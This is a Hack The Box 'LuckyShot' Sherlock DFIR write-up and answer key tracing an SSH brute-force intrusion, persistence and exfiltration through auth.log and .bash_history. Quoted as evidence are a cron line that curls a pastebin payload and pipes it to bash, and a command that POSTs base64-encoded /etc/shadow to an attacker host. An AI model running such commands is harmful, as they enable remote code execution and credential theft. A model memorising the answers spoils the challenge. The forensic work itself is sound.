p align="center">
  <img src="assets/banner.png" width="800">
</p>

<h1 align="center">🕵️ LuckyShot — Sherlock DFIR Write-Up</h1>

<p align="center">
  <b>Platform:</b> Hack The Box (Sherlock)<br>
  <b>Category:</b> Digital Forensics & Incident Response<br>
  <b>Difficulty:</b> Medium<br>
  <b>Author:</b> Shani Thakur<br>
  <b>Rank Achieved:</b> #169 🏆
</p>

<p align="center">
  🔗 <a href="https://labs.hackthebox.com/achievement/sherlock/847519/1123" target="_blank">
  Hack The Box — LuckyShot Sherlock
  </a>
</p>

---

## 🧠 Why This Write-Up Is Personal

LuckyShot was **not an easy Sherlock for me**.

Before this challenge, I had solved only **3–4 Sherlock rooms**, and most of the time I depended on **existing write-ups** to understand how DFIR investigations work.

But **LuckyShot had no public write-ups available online**.

No hints.  
No walkthroughs.  
No guidance.

This was the **first time** I solved a Sherlock **completely on my own** — through confusion, failed assumptions, and deep log analysis.

That is why this write-up is written like a **story**, explaining:
- Where I got stuck
- What I was thinking
- How I finally found the answers

---

## 📌 Case Overview

The IT Manager of **Techniqua-Solutions Corp.** reported that several critical files were missing, modified, or replaced with unknown files.

As an **Incident Response Analyst**, I was provided with forensic artifacts and tasked with identifying:
- Initial access method  
- Attacker activity timeline  
- Persistence mechanisms  
- Data exfiltration  
- Malware behavior  

---

## 🛠️ Investigation Environment

- OS Used: Kali Linux  
- Evidence Type: Live response artifacts  
- Key files analyzed:
  - `auth.log`
  - `.bash_history`
  - `/etc/cron.d/`
  - `/etc/systemd/system/`
  - Executable hash lists

---

# 🧩 Investigation Questions & Answers

---

## 🟢 Question 1  
### What method did the attacker use to gain access to the system?

**Answer:**
```
Brute Force
```

**Explanation:**  
In `auth.log`, I observed a large number of `Failed password` attempts against SSH, followed by a successful login.  
This pattern clearly indicates an **SSH brute-force attack**.

---

## 🟢 Question 2  
### At what time did the attacker successfully log in for the first time?

**Answer:**
```
2025-02-10 19:39:03
```

**Explanation:**  
Filtering `auth.log` for `Accepted password` entries revealed the earliest successful login timestamp.

---

## 🟢 Question 3  
### Which user account was compromised?

**Answer:**
```
administrator
```

**Explanation:**  
The successful SSH login entry showed the username used by the attacker.

---

## 🟢 Question 4  
### What command was used to check user privileges?

**Answer:**
```
groups administrator
```

**Explanation:**  
This command was found in `.bash_history`, commonly used to verify privilege levels.

---

## 🟢 Question 5  
### What credential-dumping tool was downloaded first?

**Answer:**
```
LaZagne
```

**Explanation:**  
The attacker cloned a GitHub repository that matched the LaZagne credential recovery tool.

---

## 🟢 Question 6  
### Which tool was used for data exfiltration?

**Answer:**
```
scp
```

**Explanation:**  
File transfers using `scp` were found in `.bash_history`.

---

## 🟢 Question 7  
### What IP address received the exfiltrated data?

**Answer:**
```
192.168.161.198
```

**Explanation:**  
The destination IP was visible in the `scp` commands.

---

## 🟢 Question 8  
### What malicious script was executed?

**Answer:**
```
sys_monitor.sh
```

**Explanation:**  
The script execution was identified in `.bash_history`.  
Its name was intentionally deceptive.

---

## 🟢 Question 9  
### What is the SHA1 hash of the malware?

**Answer:**
```
3ae5dea716a4f7bfb18046bfba0553ea01021c75
```

**Explanation:**  
The hash was found in the `hash_executables.sha1` file for `sys_monitor.sh`.

---

## 🟢 Question 10  
### What fake system service was installed?

**Answer:**
```
systemd-networkm.service
```

**Explanation:**  
A malicious service mimicking legitimate systemd naming conventions was found in `/etc/systemd/system/`.

---

## 🟢 Question 11  
### Which file started the lowest-port network listener?

**Answer:**
```
.bashrc
```

**Explanation:**  
After checking multiple persistence locations, `.bashrc` was responsible for spawning the lowest-port listener.

---

## 🟢 Question 12  
### What was the attacker’s username and hostname?

**Answer:**
```
kali@kali
```

**Explanation:**  
The attacker’s shell prompt was visible in `.bash_history`.

---

## 🟢 Question 13  
### What persistent user did the attacker create?

**Answer:**
```
Regev
```

**Explanation:**  
User creation events in `auth.log` revealed this account.

---

## 🟢 Question 14  
### When was the persistent user created?

**Answer:**
```
2025-02-10 20:11:21
```

**Explanation:**  
The timestamp was recorded in the same user-creation log entry.

---

## 🟢 Question 15  
### What command fetched and executed the remote payload?

**Answer:**  
```bash
/1 * * * root command -v curl >/dev/null 2>&1 || (apt update && apt install -y curl) && curl -fsSL https://pastebin.com/raw/SAuEez0S | rev | base64 -d | bash
```
**Explanation:**
A malicious cron job in /etc/cron.d/syscheck ensured repeated payload execution.


### 🟢 Question 16
### What command exfiltrated sensitive system files?
**Answer:**
```Bash
base64 /etc/shadow | curl -X POST -d @- http://192.168.161.198/steal.php
```
Explanation:
The decoded payload revealed this command, confirming /etc/shadow exfiltration.


---

## 📖 What I Learned

This Sherlock taught me the importance of **patience and structured thinking** in DFIR investigations.

The answers were **not handed to me**. Instead, I had to:

1. Think like an attacker  
2. Analyze logs carefully instead of jumping to conclusions  
3. Understand *why* each command was executed  
4. Correlate multiple artifacts to build the full attack timeline  

This is the **real essence of Digital Forensics & Incident Response (DFIR)** —  
following the digital trail wherever it leads, even when the path is unclear.

---

## 🎯 Tips for Beginners

If you’re new to Sherlock challenges or DFIR in general, these tips will help you a lot:

1. **Start with logs**  
   Files like `auth.log` and `.bash_history` are absolute goldmines.

2. **Think chronologically**  
   Ask yourself: *What would I do first after gaining access?*

3. **Always check persistence mechanisms**  
   Look into:
   - cron jobs
   - systemd services
   - startup files
   - user creation events

4. **Don’t give up easily**  
   Some answers take hours — or even days — and that’s okay.

5. **Document everything**  
   Write down:
   - What you checked
   - What didn’t work
   - What finally gave you the answer  

This habit alone will make you a better analyst.

---

## 🚀 Final Words

Good luck with your investigation journey!

If you found this write-up helpful, feel free to share it with others who might be struggling with **LuckyShot**.

👉 Remember: **the journey matters more than just the answers.**
